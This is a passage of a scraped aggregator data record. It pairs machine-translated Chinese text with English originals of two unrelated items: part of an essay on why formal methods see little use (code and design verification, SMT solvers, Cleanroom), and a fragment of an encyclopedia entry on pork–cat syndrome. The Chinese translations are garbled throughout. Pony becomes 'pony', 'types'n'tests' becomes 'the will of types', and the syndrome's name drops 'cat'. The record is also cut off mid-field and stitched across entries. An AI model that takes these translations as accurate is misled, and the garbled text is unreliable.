\u95ee\u9898\uff0c\u90a3\u4e48\uff1a\u201c\u662f90/95/99\uff05\u6b63\u786e\u6bd4100\uff05\u6b63\u786e\u4fbf\u5b9c\uff1f\u201d\u7b54\u6848\u662f\u975e\u5e38\u7684\u3002\u6211\u4eec\u90fd\u5f88\u4e50\u610f\u5730\u8bf4\uff0c\u6211\u4eec\u7ecf\u8fc7\u826f\u597d\u6d4b\u8bd5\u548c\u826f\u597d\u7c7b\u578b\u7684\u4ee3\u7801\u5e93\u5927\u591a\u662f\u6b63\u786e\u7684Modulo\u5728Prod\u4e2d\u7684\u4e00\u4e9b\u4fee\u590d\uff0c\u6211\u4eec\u751a\u81f3\u4e00\u5929\u5199\u4e86\u56db\u884c\u7684\u4ee3\u7801\u3002\u4e8b\u5b9e\u4e0a\uff0c\u901a\u8fc7\u7565\u5fae\u5168\u9762\u7684\u6d4b\u8bd5\u53ef\u4ee5\u9632\u6b62\u7edd\u5927\u591a\u6570\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u65ad\u3002\u8fd9\u53ea\u662f\u66f4\u5168\u9762\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u65e0\u8bba\u5982\u8bf4\u90fd\u6ca1\u6709\u6a21\u7cca\uff0c\u57fa\u4e8e\u7269\u4e1a\u7684\u6d4b\u8bd5\u6216\u6a21\u578b\u6d4b\u8bd5\u3002\u60a8\u53ef\u4ee5\u975e\u5e38\u9065\u8fdc\uff0c\u5e76\u4e14\u5728\u4e0d\u9700\u8981\u8fdb\u884c\u5168\u9762\u8bc1\u660e\u7684\u60c5\u51b5\u4e0b\u66f4\u7b80\u5355\u7684\u6280\u5de7\u3002\n \u5982\u679c\u7c7b\u578b\u7684\u9057\u5631\u6ca1\u6709\u8ba9\u4f60\u9a8c\u8bc1\u600e\u4e48\u529e\uff1f\u6bd499\uff05\u5230100\uff05\u768490\uff05\u301c99\uff05\u66f4\u5bb9\u6613\u5f97\u591a\u3002\u5982\u524d\u6240\u8ff0\uff0c\u6d01\u51c0\u5ba4\u662f\u6d89\u53ca\u5168\u9762\u6587\u6863\uff0c\u4ed4\u7ec6\u6d41\u91cf\u5206\u6790\u548c\u5e7f\u6cdb\u7684\u4ee3\u7801\u5ba1\u67e5\u7684\u5f00\u53d1\u4eba\u5458\u5b9e\u8df5\u3002\u6ca1\u6709\u8bc1\u636e\uff0c\u6ca1\u6709\u6b63\u5f0f\u9a8c\u8bc1\uff0c\u751a\u81f3\u6ca1\u6709\u4efb\u4f55\u5355\u4f4d\u6d4b\u8bd5\u3002\u4f46\u6b63\u5e38\u5b8c\u6210\uff0c\u6d01\u51c0\u5ba4\u5728\u751f\u4ea7\u4e2d\u5c06\u7f3a\u9677\u5bc6\u5ea6\u964d\u4f4e\u81f3\u5c11\u4e8e1\u4e2a\u9519\u8bef/ kloc\u3002 13\u4e2a\u4f7f\u7528\u5b83\u7684\u56e2\u961f\u5177\u6709\u6bd4\u4e0d\u4f7f\u7528\u5b83\u7684\u56e2\u961f\u76f8\u540c\u6216\u66f4\u77ed\u7684\u4ea4\u8d27\u65f6\u95f4 - \u4e00\u5929\u80af\u5b9a\u8d85\u8fc74\u884c\u3002\u6d01\u51c0\u5ba4\u672c\u8eab\u53ea\u662f\u5750\u5728\u4e3b\u6d41\u8f6f\u4ef6\u5b9e\u8df5\u548c\u4ee3\u7801\u9a8c\u8bc1\u4e4b\u95f4\u7684\u8bb8\u591a\u9ad8\u4fdd\u8bc1\u6280\u672f\u4e4b\u4e00\u3002\u60a8\u4e0d\u9700\u8981\u5b8c\u6574\u7684\u4ee3\u7801\u9a8c\u8bc1\u6765\u7f16\u5199\u826f\u597d\u7684\u8f6f\u4ef6\u751a\u81f3\u5199\u5165\u8fd1\u4e4e\u5b8c\u7f8e\u7684\u8f6f\u4ef6\u3002\u6709\u5fc5\u8981\u7684\u60c5\u51b5\uff0c\u4f46\u5bf9\u4e8e\u5927\u591a\u6570\u884c\u4e1a\u800c\u8a00\uff0c\u8fd9\u662f\u6d6a\u8d39\u91d1\u94b1\u3002\n \u4f46\u662f\uff0c\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u6574\u4f53\u7684\u6b63\u5f0f\u65b9\u6cd5\u662f\u4e0d\u7ecf\u6d4e\u7684\u3002\u8bb8\u591a\u4e0a\u8ff0\u9ad8\u4fdd\u8bc1\u6280\u672f\u4f9d\u8d56\u4e8e\u5199\u4f5c\u4ee3\u7801\u89c4\u8303\uff0c\u60a8\u4e0d\u6b63\u5f0f\u8bc1\u660e\u3002\u81f3\u4e8e\u9a8c\u8bc1\uff0c\u6709\u4e24\u79cd\u5e38\u89c1\u7684\u65b9\u5f0f\u5728\u884c\u4e1a\u4e2d\u53d7\u76ca\u3002\u9996\u5148\u662f\u9a8c\u8bc1\u8bbe\u8ba1\u800c\u4e0d\u662f\u4ee3\u7801\uff0c\u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u4ecb\u7ecd\u3002\u7b2c\u4e8c\u4e2a\u662f\u90e8\u5206\u4ee3\u7801\u9a8c\u8bc1\uff0c\u6211\u4eec\u73b0\u5728\u5c06\u8986\u76d6\u3002\n  \u5728\u65e5\u5e38\u7f16\u7a0b\u4e2d\u8fdb\u884c\u5168\u9762\u9a8c\u8bc1\u771f\u7684\u592a\u8d35\u4e86\u3002\u90e8\u5206\u9a8c\u8bc1\u600e\u4e48\u6837\uff1f\u6211\u4ecd\u7136\u53ef\u4ee5\u4ece\u8bc1\u660e\u6211\u7684\u4ee3\u7801\u7684\u67d0\u4e9b\u90e8\u5206\u7684\u4e00\u4e9b\u5c5e\u6027\u3002\u800c\u4e0d\u662f\u8bc1\u660e\u6211\u7684\u6392\u5e8f\u51fd\u6570\u603b\u662f\u6392\u5e8f\uff0c\u800c\u662f\u81f3\u5c11\u8bc1\u660e\u5b83\u4e0d\u4f1a\u6c38\u8fdc\u5faa\u73af\uff0c\u800c\u4e14\u4ece\u672a\u5199\u51fa\u8fc7\u754c\u3002\u4f60\u4ecd\u7136\u53ef\u4ee5\u5f97\u5230\u5f88\u591a\u597d\u5904\u3002\u4f8b\u5982\uff0c\u751a\u81f3\u5199\u4f5c\u5173\u4e8eC\u7a0b\u5e8f\u7684\u57fa\u672c\u8bc1\u660e\u662f\u51cf\u5c11\u5927\u91cf\u672a\u5b9a\u4e49\u884c\u4e3a\u7684\u91cd\u8981\u65b9\u6cd5\u3002\n \u8fd9\u91cc\u7684\u9650\u5236\u662f\u53ef\u7528\u6027\u7684\u3002\u5927\u591a\u6570\u8bed\u8a00\u90fd\u8bbe\u8ba1\u7528\u4e8e\u5b8c\u5168\u9a8c\u8bc1\u6216\u65e0\u9a8c\u8bc1\u3002\u5728\u524d\u4e00\u4e2a\u6848\u4f8b\u4e2d\uff0c\u4f60\u4ee5\u66f4\u5177\u8868\u73b0\u529b\u7684\u8bed\u8a00\u7f3a\u5c11\u4e86\u5f88\u591a\u597d\u7684\u529f\u80fd\uff0c\u5728\u540e\u4e00\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u8bc1\u660e\u5728\u6982\u5ff5\u4e0a\u7684\u8bed\u8a00\u4e2d\u7684\u4e1c\u897f\u3002\u56e0\u6b64\uff0c\u5927\u591a\u6570\u5173\u4e8e\u90e8\u5206\u9a8c\u8bc1\u7684\u7814\u7a76\u4fa7\u91cd\u4e8e\u51e0\u79cd\u9ad8\u4f18\u5148\u7ea7\u8bed\u8a00\uff0c\u5982C\u548cJava\u3002\u60a8\u8fd8\u770b\u5230\u5f88\u591a\u4eba\u4f7f\u7528\u53d7\u9650\u5236\u7684\u8bed\u8a00\u5b50\u96c6\u3002\u4f8b\u5982\uff0cSpark\u662fADA\u7684\u53d7\u9650\u5b50\u96c6\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u5728Spark\u4e2d\u7f16\u5199\u5173\u952e\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u5176\u4e0e\u8f83\u5c11\u5173\u952e\u7684ADA\u4ee3\u7801\u4e92\u64cd\u4f5c\u3002\u4f46\u662f\u5927\u591a\u6570\u8bed\u8a00\u90fd\u662f\u6f02\u4eae\u7684\u5229\u57fa\u3002\n \u66f4\u5e38\u89c1\u7684\u662f\uff0c\u4eba\u4eec\u5c06\u7279\u5b9a\u7c7b\u578b\u7684\u9a8c\u8bc1\u7eb3\u5165\u8bed\u8a00\u7684\u6838\u5fc3\u7ed3\u6784\u3002\u751f\u4ea7\u7c7b\u578b\u7cfb\u7edf\u662f\u4e00\u79cd\u5e38\u89c1\u5f62\u5f0f\uff1a\u4f60\u53ef\u80fd\u4e0d\u77e5\u9053\u5c3e\u5df4\u603b\u662f\u8fd4\u56de\u5c3e\u5df4\uff0c\u4f46\u81f3\u5c11\u4f60\u77e5\u9053\u5b83\u6709[a]  - \uff06gt; [\u4e00\u79cd]\u3002\u60a8\u8fd8\u6709\u50cfRust\u8fd9\u6837\u7684\u6848\u4f8b\uff0c\u8bc1\u660e\u4e86\u5185\u5b58\u5b89\u5168\u548c\u5c0f\u9a6c\uff0c\u8bc1\u660e\u4e86\u5f02\u5e38\u5b89\u5168\u3002\u8fd9\u4e9b\u4e0eSpark\u548cFrama-C\u7565\u6709\u4e0d\u540c\uff0c\u56e0\u4e3a\u60a8\u53ea\u80fd\u8fdb\u884c\u90e8\u5206\u9a8c\u8bc1\uff0c\u800c\u4e0d\u662f\u4e00\u4e9b\u90e8\u5206\u548c\u4e00\u4e9b\u5b8c\u6574\u7684\u9a8c\u8bc1\u3002\u4ed6\u4eec\u8fd8\u503e\u5411\u4e8e\u901a\u8fc7\u7f16\u7a0b\u8bed\u8a00\u4e13\u5bb6\u901a\u8fc7\u6b63\u5f0f\u7684\u65b9\u6cd5\u4e13\u5bb6\uff0c\u4e24\u6761\u5b66\u79d1\u6709\u5f88\u591a\u91cd\u53e0\u4f46\u4e0d\u76f8\u540c\u3002\u8fd9\u53ef\u80fd\u662f\u4e3a\u4ec0\u4e48Rust\u548cHaskell\u8fd9\u6837\u7684\u8bed\u8a00\u5b9e\u9645\u4e0a\u662f\u53ef\u7528\u7684\u3002 \n\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u53ea\u8ba8\u8bba\u4e86\u4ee3\u7801\u9a8c\u8bc1\u3002 \u4e0d\u8fc7\uff0c\u6b63\u5f0f\u65b9\u6cd5\u8fd8\u6709\u53e6\u4e00\u9762\uff0c\u8fd9\u662f\u4e00\u6b65\u4e00\u6b65\u62bd\u8c61\uff0c\u5e76\u9a8c\u8bc1\u8bbe\u8ba1\u672c\u8eab\u3002 \u8fd9\u8db3\u4ee5\u8ba9\u5b83\u4e0e\u6b63\u5f0f\u89c4\u8303\u7684\u4ee3\u540d\u8bcd\uff1a\u5982\u679c\u6709\u4eba\u8bf4\u4ed6\u4eec\u505a\u6b63\u5f0f\u89c4\u8303\uff0c\u4ed6\u4eec\u53ef\u80fd\u610f\u5473\u7740\u4ed6\u4eec\u6307\u5b9a\u548c\u9a8c\u8bc1\u8bbe\u8ba1\u3002  \u6b63\u5982\u6211\u4eec\u6240\u8c08\u8bba\u7684\uff0c\u8bc1\u660e\u6bcf\u4e00\u884c\u4ee3\u7801\u662f\u771f\u5b9e\u7684  ...... ", "note_en": "I saw  this question on the Software Engineering Stack Exchange:  What are the barriers that prevent widespread adoption of formal methods? The question was closed as opinion-based, and most of the answers were things like \u201cits too expensive!!!\u201d or \u201cwebsite isn\u2019t airplane!!!\u201d These are sorta kinda true but don\u2019t explain very much. I wrote this to provide a larger historical picture of formal methods, why they\u2019re actually so unused, and what we\u2019re doing to make them used.\n Before we begin, we need to lay down some terms. There really isn\u2019t a formal methods community so much as a few tiny bands foraging in the Steppe.  This means different groups use terms in different ways. Very broadly, there are two domains in FM:  formal specification is the study of how we write precise, unambiguous specifications, and  formal verification is the study of how we prove things are correct. But \u201cthings\u201d includes both code and abstract systems. Not only do we use separate means of specifying both things, we often use different means to verify them, too. To make things even more confusing, if somebody says they do formal specification, they  usually mean they both specify and verify systems, and if somebody says they do formal verification, they  usually mean mean they both specify and verify code.\n For clarity purposes, I will divide verification into  code verification (CV) and  design verification (DV), and similarly divide specification into CS and DS. These are not terms used in the wider FM world. We\u2019ll start by talking about CS and CV, then move on to DS and DV.\n Additionally, we can do  partial verification, where we only verify a subset of the spec, or  full verification, where we verify the entire spec. This could be the difference between proving \u201cit never crashes or accepts the wrong password\u201d or \u201cit never crashes or admits the wrong password and locks the account if you give the wrong password three times.\u201d Most of this history will assume we\u2019re doing full verification.\n We should also clarify the type of software we\u2019re formalizing. Most people implicitly divide software into  high-assurance software, such as medical devices and aircraft, and everything else. People assume that formal methods are widely used in the former and unnecessary for the latter. This, if anything, is too  optimistic: most people in high-assurance software don\u2019t use formal methods. We\u2019ll focus instead on \u201cregular\u201d software.\n Finally, a disclaimer: I am not a historian, and while I tried to do my due diligence there are probably mistakes here. Also, I specialize in formal specification (DS and DV), so there are more likely to be mistakes in anything I say about code verification. If you see something wrong, email me and I\u2019ll fix it.  2\n   Before we prove our code is correct, we need to know what is \u201ccorrect\u201d. This means having some form of  specification, or spec, for what the code should do, one where we can unambiguously say whether a specific output follows the spec. Just saying a list is \u201csorted\u201d is unclear: we don\u2019t know what we\u2019re sorting, what criteria we\u2019re using, or even what we mean by \u201csort\u201d. Instead, we might say \u201cA list of integers  l is  sorted in ascending order if for any two indices i and j, if  i &lt; j, then  l[i] &lt;=  l[j]\u201d.\n  The first is writing them as statements independent of the code. We would write our sort function, and in a separate file write the theorem \u201cthis returns sorted lists\u201d. This is the oldest form of spec and is still the way Isabelle and ACL2 do things.  3\n The second embeds specs in the code in the form of pre/postconditions, assertions, and invariants. We might add a postcondition on the function that \u201cthe return value is a sorted list\u201d. Assertion-based specs were originally formalized as   Hoare Logic and were first integrated into a programming language with  Euclid in the early 1970s.  4 This style is also called  Design by Contract and is the most popular form of industrial verification.  5\n Finally, we have type systems. By  Curry-Howard correspondence, any math theorem or proof can be encoded as a dependent type. We\u2019d define the type of \u201csorted lists\u201d and declare our function has the type signature  [Int] -&gt; Sorted [Int].\n You can see examples of how all of these look at  Let\u2019s Prove Leftpad. HOL4 and Isabelle are good examples of \u201cindependent theorem\u201d specs, SPARK and Dafny have \u201cembedded assertion\u201d specs, and Coq and Agda have \u201cdependent type\u201d specs.  6\n If you squint a bit it looks like these three forms of code spec map to the three main domains of automated correctness checking: tests,  contracts, and types. This is not a coincidence. Correctness is a spectrum, and formal verification is one extreme of that spectrum. As we reduce the rigour (and effort) of our verification we get simpler and narrower checks, whether that means limiting the explored state space, using weaker types, or pushing verification to the runtime. Any means of total specification then becomes a means of partial specification, and vice versa: many consider   Cleanroom a formal verification technique, which primarily works by pushing code review far beyond what\u2019s humanly possible.\n  Verification proves code matches its spec. This raises a question: how do we know we have the right spec? Finding the right spec is one of the biggest challenges in formal methods. It\u2019s also one of the most raised objections, but the way skeptics mean it isn\u2019t  exactly the same as the way advocates think of it.\n When outsiders say \u201chow do you have the right spec?\u201d they\u2019re  usually thinking of  validation: showing a spec actually does what the client wants. If you formally prove your code sorts a list, but the customer actually wants Uber For Soups \u2122, you\u2019ve just wasted a bunch of time. Only by rapid iteration and short feedback cycles, people argue, can you actually validate your requirements.\n It is true that verifying code does not validate the code. There are two problems with this argument, though. The first is that it just delays the value of FM, not eliminate it entirely. Once you\u2019ve done your rapid iterations, you presumably have an idea of what your customer wants.  Then you start verifying code. Second, while we don\u2019t know what exactly the customer wants, there are some things we can assume they  don\u2019t want. They don\u2019t want the software randomly crashing on them. They don\u2019t want security holes. Everybody recognizes the importance of this: after all, nobody is saying you should skip unit tests while you iterate. So, at the very least, prove your version control system doesn\u2019t randomly delete chapters of a user\u2019s book.  7\n The problem with finding the right spec is more fundamental:  we often don\u2019t know what we want the spec to be. We think of our requirements in human terms, not mathematical terms. If I say \u201cthis should distinguish parks from birds\u201d, what am I  saying? I could explain to a human by giving a bunch of pictures of parks and birds, but that\u2019s just specific examples, not capturing the  idea of distinguishing parks from birds. To actually translate that to a formal spec requires us to be able to formalize human concepts, and that is a serious challenge.\n Don\u2019t get me wrong, it\u2019s possible to figure out the appropriate specs here and experts do it all of the time. But writing appropriate specs is a skill you need to develop, just as you needed to develop coding skills. This is why a lot of the more recent successes with code verification have been things with an obvious map between what we want and what we can express we want. For example,  CompCert is a formally verified C compiler. The spec there is \u201cthis will never miscompile\u201d.\n And none of this is the actual verification part. Once you  have a spec, you still need to prove the code  matches the spec.\n  The earliest means of code verification we see is the the Dijkstra-style \u201cthink really hard about why it\u2019s true\u201d method, which is basically what ALGOL was designed to help do. For example, I might \u201cprove\u201d an insertion sort works by arguing\n Base Case: if we have an empty list and add one element to it, that will be the only element, so it will be sorted.\n If we have a sorted list with  k elements and add one element, we insert the element so that it is after all smaller numbers and before all larger numbers. This means the list is still sorted.\n Obviously it\u2019d look more rigorous than that, but that\u2019s the general idea. Dijkstra and others used this style to prove a bunch of algorithms were correct, including many concurrency primitives. It\u2019s also the style that gives rise to the  Knuth quote \u201cBeware of bugs in the above code; I have only proved it correct, not tried it.\u201d It\u2019s pretty easy to screw up a math proof in a way nobody notices, and I\u2019ve read  estimates that something like 20% of published math proofs have errors in them.  Peter Guttmann has a great essay on how farcical code proofs got, where tons of \u201cproven\u201d code would immediately crash if run.\n At the same time we were exploring how to automatically prove mathematical theorems, the first such  theorem prover coming out in  1967. Researchers in the Pascal community were using theorem provers to verify programs by the  early 1970s, then programming in dedicated verification languages by mid-decade. People would write some properties of the code and then write a checkable proof that the code had those properties. Earlier theorem provers simply helped humans check and verify proofs while more sophisticated ones could prove parts of the theorem on their own.\n   Proofs are hard. Obnoxiously hard. \u201cQuit programming and join the circus\u201d hard. Surprisingly, formal code proofs are often  more rigorous than the proofs most mathematicians write! Mathematics is a very creative activity with a definite answer that\u2019s only valid if you show your work. Creativity, formalism, and computers are a bad combination.\n Take the above induction. Any mathematician could look at that and immediately know what induction is, how it works, and how it\u2019s valid in this case. These are all things we need to rigorously formalize in the theorem prover. Same with proof by contradiction, proof by contrapositive, etc. Along with this, we also need to formalize every assumption, even the stuff that most mathematicians don\u2019t bother to prove. For example, addition is associative:  a + (b + c) = (a + b) + c. The theorem prover doesn\u2019t a priori know that\u2019s true. You either have to prove it (hard), declare it an assumption the prover can take as true (dangerous), or buy a theorem library from someone who already proved it (expensive). Early proof assistants competed on the number of inbuilt proof tactics and bundled theorem libraries. One of the first widespread proof checkers, SPADE, advertised its complete arithmetic library as a key selling point.\n Next, you gotta actually get the proof. You can have the prover try to find it on its own, or write it yourself. In the general case, automatically infering a proof is undecidable. For extremely restricted cases, like propositional logic or HM type-checking, it\u2019s \u201conly\u201d NP-complete. For the most part we\u2019re stuck writing most of the proof ourselves and having the computer verify it\u2019s correct. That means you need a strong background in:\n The intricacies of the theorem prover you\u2019re using, which is a specialty unto itself\n To make things worse, computer properties throw a lot of wrenches into proofs. Remember how I said assuming addition was associative is dangerous? Some languages aren\u2019t associative. C++ has  INT_MAX.  ((-1) + INT_MAX) + 1 is  INT_MAX.  -1 + (INT_MAX + 1) is undefined. If you assume associative addition in C++, your proof will be wrong, and your code will be broken. You either have to avoid making that assertion, or prove that for your specific snippet, you never cause an overflow.\n Now you could say that undefined addition is a bug, and you should be using a language with unbound integers. But most languages have positive features that impede proofs. Take the following snippet:\n  Is that always true? Depends. Maybe  f modifies  a. Maybe another thread concurrency modifies  a. Maybe  b is aliased to  a, so modifying it also modifies  a.  8 If any of these are possible in your language, you have to explicitly prove they don\u2019t happen here. Purity helps in this case but can wreck proofs in other cases, as it forces you to use recursion and higher-order functions to get stuff done. Both of those, incidentally, are foundational to writing good functional programs. What\u2019s good for coding is bad for proving!  9\n Formal verifiers have a dilemma: the more expressive the language, the harder it is to prove anything in it. But the less expressive the language, the harder it is to  write anything in it. The first production verification languages were very restricted subsets of more expressive languages: ACL2 was a subset of Lisp, Euclid was a subset of Pascal, etc. And nothing we\u2019ve discussed so far gets into actually proving real-world programs, this is all just the table stakes to start writing proofs in the first place.\n Proofs are hard. They have, however, been getting better. Proof assistant researchers keep adding new heuristics, theorem libraries, preverified components, etc. Hardware improvements help, too: faster computers means faster searches.\n  These days the most population approach to proof automation is  SMT.  10 Speaking very broadly, an SMT solver can turn (some) theorems into constraint satisfaction problems. This turns a creative problem into a computational one. You may still need to feed it intermediate problems (lemmas) as steps in your theorem, but that\u2019s better than proving every damn thing yourself. Stanford released the first \u201cmodern\u201d SMT solver, the  Stanford Validity Checker, in 1998. They built on that to make CVC, released in 2002, which saw minor production use.   11\n The scene changed around 2006, when Microsoft Research released Z3. The big advantage of Z3 was it was a lot more user-friendly than other SMTs, which honestly wasn\u2019t saying much. MSR used it internally to help prove properties of the Windows kernel, meaning they invested more-than-the-bare-minimum in UX. Z3 arguably made SMT the default choice for general-purpose automated proving. Many tools in CV now rely on SMT, and most of those come with Z3 by default.\n Accessible SMT solving was a kick in the pants to the formal verification community, as it makes a lot of simple proofs trivial and nasty proofs tractable. This, in turn, meant people could start proving things in more expressive languages, as they now had the power to tackle the challenges of expressive statements. The incredible progress here is evident in the  IronFleet project: by using advanced SMT solvers and a cutting-edge verification language, Microsoft was able to write 5,000 lines of verified Dafny code in only 3.7 person-years! That\u2019s a blazing-fast rate of  four whole lines a day.   12\n   Now would be a good time to step back and ask \u201cwhat\u2019s the point?\u201d We\u2019re trying to prove some program conforms to some spec. Correctness is a spectrum. There are two parts of the verification question: how objectively \u201ccorrect\u201d your program is, and how much you\u2019ve rigorously verified the correctness. Obviously, more verified is better than less verified, but verification costs time and money. If we have multiple constraints to optimize (performance, time to market, cost, etc), the optimium isn\u2019t necessarily \u201cfully proved correct\u201d. Then the question becomes \u201cwhat\u2019s the minimal verification we need\u201d and \u201chow much does it cost to get there.\u201d In  most cases you can get away with, like, 90% or 95% or 99% correct. You may be better off spending time making the UX better than getting that last 1% of correctness.\n The question, then: \u201cis 90/95/99% correct significantly cheaper than 100% correct?\u201d The answer is very yes. We all are comfortable saying that a codebase we\u2019ve well-tested and well-typed is  mostly correct modulo a few fixes in prod, and we\u2019re even writing more than four lines of code a day. In fact,  the vast majority of distributed systems outages could have been prevented by slightly-more-comprehensive testing. And that\u2019s just more comprehensive unit testing, to say nothing of fuzzing, property-based testing, or model-testing. You can get really far with simpler tricks without needing to go on to full proofs.\n What if types\u2019n\u2019tests isn\u2019t getting you enough verification? It\u2019s still much easier to go from 90% to 99% than from 99% to 100%. As mentioned earlier, Cleanroom is a developer practice involving comprehensive documentation, careful flow analysis, and extensive code review. No proofs, no formal verification, not even any unit testing. But done properly, Cleanroom reduces the defect density to less than 1 bug/kLoC in production.  13 Teams using it have equal or shorter delivery times than teams that don\u2019t use it- certainly better than 4 lines a day. And Cleanroom itself is just one of many high-assurance techniques that sit between mainstream software practices and code verification. You do not need full code verification to write good software or even to write near-perfect software. There are cases where it\u2019s necessary, but for most of the industry it\u2019s a waste of money.\n However, that does not mean formal methods as a whole is uneconomical. Many aforementioned high-assurance techniques rely on writing code specs that you don\u2019t formally prove. As for verification, there are two common ways people benefit from it in the industry. The first is verifying designs instead of code, which we will cover in the next section. The second is  partial code verification, which we will cover right now.\n  It\u2019s too expensive doing full verification in day-to-day programming. What about partial verification? I could still benefit from proving some properties of some parts of my code. Instead of proving that my sort function always sorts, I can at least prove it doesn\u2019t loop forever and never writes out of bounds. You can still get a lot of benefit out of this. For example, writing even basic proofs about C programs is a great way to  cut out huge amounts of undefined behavior.\n The limitation here is  availability. Most languages are designed for either full verification or no verification. In the former case, you\u2019re missing a lot of nice features in more expressive languages, and in the latter case you a need a way to prove stuff in a language hostile to the concept. For this reason, most of the research on partial verification focuses on a few high-priority languages, like  C and Java. You also see a lot of people working with restricted subsets of languages. For example, SPARK is a restricted subset of Ada, so you can write critical stuff in SPARK and have it interop with less-critical Ada code. But most languages like that are pretty niche.\n More commonly, people bake specific kinds of verification into the the core structure of languages. Production type systems are a common form of this: you may not know that  tail always returns the tail, but at  least you know that it has type  [a] -&gt; [a]. You also have cases like Rust, which proves memory safety, and Pony, which proves exception safety. These are slightly different from SPARK and Frama-C in that you can  only do partial verification, not some partial and some full verification. They also tend to be made by programming language experts over formal methods experts, two disciplines that have a lot of overlap but aren\u2019t identical. This might be why languages like Rust and Haskell are actually-kinda-usable in practice.\n  So far we\u2019ve only talked about code verification. There\u2019s another side to formal methods, though, which is going one step more abstract and verifying the designs themselves. This is deep enough that it\u2019s synonymous with  formal specification: if somebody says they do formal specification, they probably mean they specify and verify designs.\n As we talked about, proving every line of code is real\n......", "posttime": "2021-06-22 16:43:07", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "people,\u9a8c\u8bc1", "title": "\u4eba\u4eec\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528\u6b63\u5f0f\u65b9\u6cd5\uff1f -  2019\u5e74 ", "title_en": "Why Don't People Use Formal Methods? \u2013 2019", "transed": 1, "url": "https://www.hillelwayne.com/post/why-dont-people-use-formal-methods/", "via": "", "real_tags": ["people", "\u9a8c\u8bc1"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067392, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8df3\u8f6c\u5230\u5bfc\u822a\u8df3\u8dc3\u4ee5\u641c\u7d22\u732a\u8089\u7efc\u5408\u75c7\u662f\u732a\u8089\u7684\u8fc7\u654f\uff0c\u901a\u5e38\u5728\u9752\u6625\u671f\u540e\uff0c\u8fd9\u662f\u7531\u66b4\u9732\u5728\u732b\u5f15\u8d77\u7684\u3002\u867d\u71361994\u5e74\u9996\u6b21\u63cf\u8ff0\uff0c\u4f46[1] [2] [3]\u9996\u5148\u5728\u7f8e\u56fd\u65af\u79d1\u7279\u59d4\u5458\u4f1a\u548c\u6258\u9a6c\u65af\u666e\u62c9\u65af\u5382\u5728alpha-gal\u8fc7\u654f\u7684\u7814\u7a76\u671f\u95f4\u9996\u6b21\u8bb0\u5f55\u5728\u7f8e\u56fd\u3002 [4]\n \u5b83\u88ab\u79f0\u4e3a\uff0334;\u732a\u8089\u7efc\u5408\u75c7\uff06\uff0334;\u56e0\u4e3a\uff06\uff0334;\u51e0\u4e4e\u6240\u6709\u6761\u4ef6\u7684\u4eba\u90fd\u662f\u732b\u4e3b\u4eba\uff0c\u8bb8\u591a\u4eba\u90fd\u6709\u591a\u53ea\u732b\u3002\u4e00\u4e9b\u5bf9\u732b\u8840\u6e05\u767d\u86cb\u767d\uff08\u732b\u809d\u810f\u86cb\u767d\u8d28\u5236\u6210\u7684\u86cb\u767d\u8d28\uff09\u4ea7\u751f\u8fc7\u654f\u53cd\u5e94\uff0c\u5f53\u6709\u4eba\u6d88\u8017\u5b83\u65f6\uff0c\u5728\u732a\u8089\u4e2d\u4e0e\u767d\u86cb\u767d\u4ea4\u53c9\u53cd\u5e94\uff0c\u5e76\u4e14\u5f53\u732a\u8089\u6d88\u8017\u65f6\u53ef\u80fd\u5bfc\u81f4\u4e25\u91cd\u751a\u81f3\u81f4\u547d\u7684\u8fc7\u654f\u53cd\u5e94\u3002\uff06\uff0334; [4]\n  ^ abreu\uff0c\u5361\u5c14\u83ab;\u6208\u9ea6\u65af\uff0c\u62c9\u594e\u5c14; Bartolome Borja\uff0cBial-Ar\u00edstegui;\u5f17\u62c9\u7eb3\uff0c\u6d77\u4f26\u5a1c; Cunha\uff0cLeonor\uff082015\u5e743\u670830\u65e5\uff09\u3002 \uff06\uff0334;\u732a\u8089\u7efc\u5408\u75c7\uff1f\uff06\uff0334;\u3002\u4e34\u5e8a\u7ffb\u8bd1\u8fc7\u654f\u3002 5\uff083\uff09\uff1aP164\u3002 DOI\uff1a10.1186 / 2045-7022-5-S3-P164\u3002 PMC 4412402\u3002\n  ^ posthumus\uff0c\u4e54\u7eb3\u68ee;\u8a79\u59c6\u65af\uff0c\u6d77\u8389\u00b7\u5df7\uff0c\u67e5\u5c14\u65afj;\u9a6c\u6258\u65af\uff0c\u8def\u6613\u65af;\u666e\u62c9\u65af\u5382\uff0c\u6258\u9a6c\u65afA e; Commins\uff0cScott P\uff082017\u5e743\u670824\u65e5\uff09\u3002 \uff06\uff0334;\u7f8e\u56fd\u732a\u8089\u7efc\u5408\u75c7\u7684\u521d\u59cb\u63cf\u8ff0\u3002 j alerergy inlmunol\u3002 131\uff083\uff09\uff1a923-925\u3002 DOI\uff1a10.1016 / J.Jaci.2012.12.665\u3002 PMC 3594363.PMID 23352634\u3002 ", "note_en": "Jump to navigation  Jump to search  Pork\u2013cat syndrome is an  allergy to  pork, usually after  adolescence, that is caused by exposure to  cats. Although first described in 1994,  [1]  [2]  [3] it was first documented in the U.S. by Scott Commins and  Thomas Platts-Mills during their research on  alpha-gal allergy.  [4]\n It is called &#34;pork\u2013cat syndrome&#34; because &#34;almost all people with the condition are cat owners, and many have multiple cats. Some develop an allergic response to cat  serum albumin (protein made by a cat\u2019s  liver) that cross-reacts with albumin in pork when someone consumes it, and can lead to severe or even fatal allergic reactions when pork is consumed.&#34;  [4]\n  ^   Abreu, Carmo; Gomes, Raquel; Bartolome Borja, Bial-Ar\u00edstegui; Falc\u00e3o, Helena; Cunha, Leonor (30 March 2015).  &#34;Pork-cat syndrome?&#34;.  Clin Transl Allergy.  5 (Suppl 3): P164.  doi: 10.1186/2045-7022-5-S3-P164.  PMC\u00a0  4412402.\n  ^    Posthumus, Jonathon; James, Hayley R; Lane, Charles J; Matos, Luis A; Platts-Mills, Thomas A E; Commins, Scott P (24 March 2017).  &#34;Initial Description of Pork-Cat Syndrome in 